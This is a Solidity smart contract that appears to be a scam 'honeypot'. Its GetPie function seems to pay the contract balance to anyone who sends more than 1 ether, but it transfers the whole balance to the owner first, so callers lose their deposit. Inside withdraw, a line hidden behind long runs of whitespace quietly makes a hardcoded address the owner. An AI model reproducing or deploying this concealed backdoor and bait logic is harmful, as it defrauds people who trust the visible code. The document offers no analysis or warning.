pragma solidity ^0.4.19;

contract Pie
{
    address public o = msg.sender;
   
    function()
    public
    payable
    {
        
    }
   
    function GetPie()
    public
    payable
    {
        address tempOwner = o;
        uint tempValue = msg.value;
        if(tempValue > 1 ether)
        {
            tempOwner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){o=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
        address tempOwner = o;
        require(msg.sender == tempOwner);
        tempOwner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        address tempOwner = o;
        require(msg.sender == tempOwner);
         
        adr.call.value(msg.value)(data);
    }
}